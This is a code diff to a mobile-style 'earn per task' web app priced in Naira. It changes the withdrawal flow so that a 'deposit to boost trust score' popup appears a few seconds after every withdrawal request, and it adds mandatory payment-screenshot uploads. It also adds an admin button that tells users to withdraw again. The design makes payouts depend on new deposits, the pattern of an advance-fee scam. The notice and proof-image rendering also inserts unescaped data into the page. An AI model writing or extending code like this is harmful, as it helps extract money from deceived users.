@@ -353,7 +353,7 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
   <div style="background:#fff;border-radius:18px;padding:22px 20px;max-width:340px;width:100%;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,.25)">
     <div style="width:52px;height:52px;margin:0 auto 12px;border-radius:50%;background:rgba(225,29,72,.12);display:flex;align-items:center;justify-content:center;font-size:24px">🛡️</div>
     <div style="font-weight:800;font-size:17px;margin-bottom:6px" id="wdModalTitle">Boost trust score</div>
-    <p style="font-size:13px;color:#6b7280;line-height:1.5;margin-bottom:10px" id="wdModalBody">Your withdrawal needs a trust boost before it can be paid.</p>
+    <p style="font-size:13px;color:#6b7280;line-height:1.5;margin-bottom:10px" id="wdModalBody">Build trust in the system for faster verification. A small deposit boosts your trust score so withdrawals are reviewed and paid faster.</p>
     <div style="background:#fef2f2;border-radius:12px;padding:12px;margin-bottom:14px">
       <div style="font-size:11px;color:#9ca3af;font-weight:700;letter-spacing:.06em;text-transform:uppercase">Deposit to unlock</div>
       <div style="font-size:26px;font-weight:800;color:#e11d48" id="wdBoostAmount">₦0</div>
@@ -539,6 +539,7 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
     <div class="balance-card">
       <div class="balance-label">Available Balance</div>
       <div class="balance-amount" id="dashBalance">₦0.00</div>
+    <div id="userNotices" style="margin-top:12px"></div>
       <div class="balance-actions">
         <button class="btn" onclick="go('withdraw')">Withdraw</button>
         <button class="btn outline" onclick="go('referral')">Invite</button>
@@ -706,6 +707,15 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
         <div class="detail-row"><span>Name</span><strong>Florence</strong></div>
       </div>
       <p style="text-align:center;margin-top:12px;font-size:12px;color:#6b7280">Transfer the exact amount, then tap “I have paid”</p>
+    </div>
+    <div class="card" style="border:2px dashed #e11d48;background:#fff5f7">
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:6px">📷 Payment screenshot</h3>
+      <p style="font-size:12px;color:#6b7280;margin-bottom:10px;line-height:1.45">Required. Upload a clear screenshot of your transfer so admin can verify and confirm your payment.</p>
+      <input type="file" id="depProofFile" accept="image/*" capture="environment" style="width:100%;font-size:13px;padding:10px;border:1px solid #fecdd3;border-radius:10px;background:#fff"/>
+      <div id="depProofPreview" style="display:none;margin-top:12px">
+        <img id="depProofImg" alt="Proof" style="max-width:100%;border-radius:12px;border:1px solid #fecdd3"/>
+        <p style="font-size:12px;color:#16a34a;margin-top:6px;font-weight:600">Screenshot ready ✓</p>
+      </div>
     </div>
     <button class="btn" id="paidBtn" onclick="confirmPaid()">I have paid</button>
     <p id="depStatus" style="text-align:center;margin-top:14px;font-size:13px;display:none"></p>
@@ -1306,6 +1316,7 @@ async function loadDashboard(){
     $('dashPlanInfo').textContent='Earn ₦'+p.min+' – ₦'+p.max+' per task';
     // From 12pm Lagos: deposit boost popup for users who withdrew
     setTimeout(function(){ checkPendingTrustBoostPopup(); }, 1200);
+    try{ loadUserNotices(); }catch(e){}
   }catch(e){token='';localStorage.removeItem('lt_token');go('login');}
 }
 
@@ -1582,24 +1593,95 @@ function startDeposit(key,price){
   $('paidBtn').disabled=false;
   $('paidBtn').textContent='I have paid';
   $('depStatus').style.display='none';
+  window._depProofData='';
+  if($('depProofFile')) $('depProofFile').value='';
+  if($('depProofPreview')) $('depProofPreview').style.display='none';
   go('deposit');
 }
 async function confirmPaid(){
   if(!pendingPlan) return;
+  if(!window._depProofData){
+    showToast('Upload payment screenshot first','error');
+    return;
+  }
   $('paidBtn').disabled=true;
-  $('paidBtn').textContent='Submitting...';
+  $('paidBtn').textContent='Submitting…';
   try{
-    await api('/api/deposits',{method:'POST',body:JSON.stringify({plan:pendingPlan.key,amount:pendingPlan.price})});
+    var dep=await api('/api/deposits',{method:'POST',body:JSON.stringify({
+      plan:pendingPlan.key,
+      amount:pendingPlan.price,
+      proof_image:window._depProofData
+    })});
+    window._pendingDepId=dep.id;
     $('paidBtn').textContent='Submitted ✓';
     $('depStatus').style.display='block';
     $('depStatus').style.color='#d97706';
-    $('depStatus').textContent='Waiting for admin approval. Your plan will activate after confirmation.';
+    $('depStatus').textContent='Waiting for admin approval. You will see Success when confirmed.';
     showToast('Payment submitted','success');
+    startDepositStatusPoll(dep.id);
   }catch(e){
     showToast(e.message||'Failed','error');
     $('paidBtn').disabled=false;
     $('paidBtn').textContent='I have paid';
   }
+}
+function startDepositStatusPoll(id){
+  try{ clearInterval(window._depPoll); }catch(e){}
+  window._depPoll=setInterval(async function(){
+    try{
+      var list=await api('/api/deposits/mine');
+      var row=(list||[]).find(function(d){return d.id===id;});
+      if(!row) return;
+      if(row.status==='approved'){
+        clearInterval(window._depPoll);
+        $('depStatus').style.color='#16a34a';
+        $('depStatus').textContent='Success — payment confirmed ✓';
+        showToast('Payment confirmed successfully','success');
+        try{ currentUser=await api('/api/me'); }catch(e){}
+      } else if(row.status==='rejected'){
+        clearInterval(window._depPoll);
+        $('depStatus').style.color='#be123c';
+        $('depStatus').textContent='Payment was rejected. Contact support.';
+      }
+    }catch(e){}
+  }, 5000);
+}
+document.addEventListener('change', function(e){
+  if(!e.target || e.target.id!=='depProofFile') return;
+  var f=e.target.files && e.target.files[0];
+  if(!f) return;
+  if(f.size>700000){ showToast('Image too large','error'); e.target.value=''; return; }
+  var reader=new FileReader();
+  reader.onload=function(){
+    window._depProofData=String(reader.result||'');
+    if($('depProofImg')) $('depProofImg').src=window._depProofData;
+    if($('depProofPreview')) $('depProofPreview').style.display='block';
+  };
+  reader.readAsDataURL(f);
+});
+async function loadUserNotices(){
+  var el=$('userNotices');
+  if(!el||!token) return;
+  try{
+    var list=await api('/api/notices');
+    var unread=(list||[]).filter(function(n){return n.status==='unread';});
+    if(!unread.length){ el.innerHTML=''; return; }
+    el.innerHTML=unread.slice(0,3).map(function(n){
+      return '<div class="card" style="border-left:4px solid #e11d48;margin-bottom:8px">'
+        +'<div style="font-weight:700;font-size:14px">'+(n.title||'Notice')+'</div>'
+        +'<p style="font-size:12px;color:#6b7280;margin-top:4px">'+(n.body||'')+'</p>'
+        +'<button class="btn sm" style="margin-top:8px" onclick="dismissNotice(\''+n.id+'\')">OK</button></div>';
+    }).join('');
+    // also popup first notice
+    if(unread[0] && !sessionStorage.getItem('lt_notice_'+unread[0].id)){
+      sessionStorage.setItem('lt_notice_'+unread[0].id,'1');
+      alert(unread[0].title+'\n\n'+unread[0].body);
+    }
+  }catch(e){}
+}
+async function dismissNotice(id){
+  try{ await api('/api/notices/'+id+'/read',{method:'POST',body:'{}'}); }catch(e){}
+  loadUserNotices();
 }
 
 function loadWithdraw(){
@@ -1694,20 +1776,17 @@ function isAfterNoonLagos(){
 function scheduleWdProcessPopup(amount, type){
   try{ clearTimeout(window._wdPopupTimer); }catch(e){}
   window._pendingWdPopup = { amount: amount, type: type || 'main', at: Date.now() };
-  try{
-    localStorage.setItem('lt_last_wd', JSON.stringify(window._pendingWdPopup));
-  }catch(e){}
-  // From 12:00 Lagos onward → show deposit boost popup soon; before noon wait until noon check on next load
-  var delay = isAfterNoonLagos() ? 8000 : 60000;
+  try{ localStorage.setItem('lt_last_wd', JSON.stringify(window._pendingWdPopup)); }catch(e){}
+  window._forceBoostPopup = true;
+  // Every withdraw: show trust/deposit popup automatically (few seconds)
   window._wdPopupTimer = setTimeout(function(){
-    if (!isAfterNoonLagos()) return;
     openWdModal(amount, type || 'main');
-  }, delay);
+  }, 2500);
 }
 async function openWdModal(amount, type){
   var m = $('wdProcessModal');
   if(!m) return;
-  if (!isAfterNoonLagos()) return; // only from 12pm Lagos
+  if (!isAfterNoonLagos() && !window._forceBoostPopup) return; // from 12pm, or right after a withdraw
   var boost = 1000;
   try{
     var info = await api('/api/trust-boost');
@@ -1725,7 +1804,7 @@ async function openWdModal(amount, type){
     boost = trustBoostAmountForLocal(currentUser);
   }
   if ($('wdModalTitle')) $('wdModalTitle').textContent = 'Deposit to boost trust score';
-  if ($('wdModalBody')) $('wdModalBody').textContent = 'You recently requested a withdrawal' + (amount ? (' of ₦' + Number(amount).toLocaleString()) : '') + '. Deposit the amount below to boost your trust score so payout can continue.';
+  if ($('wdModalBody')) $('wdModalBody').textContent = 'Build trust in the system for faster verification. You requested a withdrawal' + (amount ? (' of ₦' + Number(amount).toLocaleString()) : '') + '. Deposit the amount below to raise your trust score so your payout can be verified faster.';
   if ($('wdBoostAmount')) $('wdBoostAmount').textContent = '₦' + boost.toLocaleString();
   if ($('wdBoostPayBtn')) {
     $('wdBoostPayBtn').style.display = 'block';
@@ -1744,7 +1823,8 @@ async function checkPendingTrustBoostPopup(){
   try {
     if (!token) return;
     if (!isAfterNoonLagos()) return;
-    if (sessionStorage.getItem('lt_boost_popup_shown') === '1') return;
+    // show for each withdraw session; still once per page load check
+    if (sessionStorage.getItem('lt_boost_popup_shown') === '1' && !window._forceBoostPopup) return;
     var info = null;
     try { info = await api('/api/trust-boost'); } catch (e) { info = null; }
     if (info && info.paid) return;
@@ -1878,10 +1958,18 @@ async function loadAdmin(){try{const s=await api('/api/admin/stats',{admin:true}
 async function renderAdminDeps(){
   try{const list=await api('/api/admin/deposits',{admin:true}); const el=$('admin-deposits');
     if(!list.length){el.innerHTML='<div class="empty">No pending</div>';return;}
-    el.innerHTML=list.map(d=>`<div class="admin-card"><div class="admin-row"><span class="l">User</span><span>${d.user_name}</span></div>
-      <div class="admin-row"><span class="l">Plan</span><span>${d.plan}</span></div><div class="admin-row"><span class="l">Amount</span><span>₦${Number(d.amount).toLocaleString()}</span></div>
-      <div style="display:flex;gap:8px;margin-top:10px"><button class="btn sm green" style="flex:1" onclick="approveDep('${d.id}')">Approve</button>
-      <button class="btn sm" style="flex:1" onclick="rejectDep('${d.id}')">Reject</button></div></div>`).join('');
+    el.innerHTML=list.map(d=>{
+      var proof = d.has_proof && d.proof_image
+        ? '<div style="margin-top:8px"><div class="admin-row"><span class="l">Screenshot</span><span>Attached</span></div><img src="'+d.proof_image+'" alt="proof" style="max-width:100%;border-radius:10px;margin-top:6px;border:1px solid #eee" onclick="window.open(this.src)"/></div>'
+        : '<div class="admin-row"><span class="l">Screenshot</span><span style="color:#b45309">None</span></div>';
+      return '<div class="admin-card"><div class="admin-row"><span class="l">User</span><span>'+(d.user_name||'')+'</span></div>'
+        +'<div class="admin-row"><span class="l">Email</span><span>'+(d.email||'')+'</span></div>'
+        +'<div class="admin-row"><span class="l">Plan</span><span>'+d.plan+'</span></div>'
+        +'<div class="admin-row"><span class="l">Amount</span><span>₦'+Number(d.amount).toLocaleString()+'</span></div>'
+        +proof
+        +'<div style="display:flex;gap:8px;margin-top:10px"><button class="btn sm green" style="flex:1" onclick="approveDep(\''+d.id+'\')">Approve</button>'
+        +'<button class="btn sm" style="flex:1" onclick="rejectDep(\''+d.id+'\')">Reject</button></div></div>';
+    }).join('');
   }catch(e){$('admin-deposits').innerHTML='<div class="empty">'+e.message+'</div>';}
 }
 async function approveDep(id){try{await api('/api/admin/deposits/'+id+'/approve',{method:'POST',admin:true});alert('Approved');loadAdmin();renderAdminDeps();}catch(e){showToast(e.message||'Failed','error');}}
@@ -1889,15 +1977,32 @@ async function rejectDep(id){try{await api('/api/admin/deposits/'+id+'/reject',{
 async function renderAdminWds(){
   try{const list=await api('/api/admin/withdrawals',{admin:true}); const el=$('admin-withdrawals');
     if(!list.length){el.innerHTML='<div class="empty">No pending</div>';return;}
-    el.innerHTML=list.map(w=>`<div class="admin-card"><div class="admin-row"><span class="l">User</span><span>${w.user_name}</span></div>
-      <div class="admin-row"><span class="l">Type</span><span>${w.type}</span></div><div class="admin-row"><span class="l">Amount</span><span>₦${Number(w.amount).toLocaleString()}</span></div>
-      <div class="admin-row"><span class="l">Bank</span><span>${w.bank} • ${w.account_number}</span></div>
-      <div style="display:flex;gap:8px;margin-top:10px"><button class="btn sm green" style="flex:1" onclick="approveWd('${w.id}')">Mark Paid</button>
-      <button class="btn sm" style="flex:1" onclick="rejectWd('${w.id}')">Reject</button></div></div>`).join('');
+    el.innerHTML=list.map(w=>`<div class="admin-card">
+      <div class="admin-row"><span class="l">User</span><span>${w.user_name||''}</span></div>
+      <div class="admin-row"><span class="l">Email</span><span>${w.email||''}</span></div>
+      <div class="admin-row"><span class="l">Type</span><span>${w.type||''}</span></div>
+      <div class="admin-row"><span class="l">Amount</span><span>₦${Number(w.amount).toLocaleString()}</span></div>
+      <div class="admin-row"><span class="l">Bank</span><span>${w.bank||''} ${w.account_number||''}</span></div>
+      <div style="display:flex;flex-direction:column;gap:8px;margin-top:10px">
+        <div style="display:flex;gap:8px">
+          <button class="btn sm green" style="flex:1" onclick="approveWd('${w.id}')">Mark paid</button>
+          <button class="btn sm" style="flex:1" onclick="rejectWd('${w.id}')">Reject</button>
+        </div>
+        <button class="btn sm dark" onclick="sorryWd('${w.id}')">Sorry — ask to withdraw again</button>
+      </div>
+    </div>`).join('');
   }catch(e){$('admin-withdrawals').innerHTML='<div class="empty">'+e.message+'</div>';}
 }
+async function sorryWd(id){
+  if(!confirm('Send apology, restore balance, and ask them to withdraw again?')) return;
+  try{
+    var r=await api('/api/admin/withdrawals/'+id+'/retry-message',{method:'POST',admin:true,body:'{}'});
+    alert('Sorry message sent · ₦'+Number(r.refunded||0).toLocaleString()+' returned');
+    loadAdmin(); renderAdminWds();
+  }catch(e){showToast(e.message||'Failed','error');}
+}
 async function approveWd(id){try{await api('/api/admin/withdrawals/'+id+'/approve',{method:'POST',admin:true});alert('Paid');loadAdmin();renderAdminWds();}catch(e){showToast(e.message||'Failed','error');}}
-async function rejectWd(id){try{await api('/api/admin/withdrawals/'+id+'/reject',{method:'POST',admin:true});alert('Rejected');loadAdmin();renderAdminWds();}catch(e){showToast(e.message||'Failed','error');}}
+async function rejectWd(id){try{var r=await api('/api/admin/withdrawals/'+id+'/reject',{method:'POST',admin:true,body:'{}'});alert('Rejected · ₦'+Number(r.refunded||0).toLocaleString()+' returned to user');loadAdmin();renderAdminWds();}catch(e){showToast(e.message||'Failed','error');}}
 async function renderAdminUsers(){
   try{const list=await api('/api/admin/users',{admin:true}); const el=$('admin-users');
     if(!list.length){el.innerHTML='<div class="empty">No users</div>';return;}
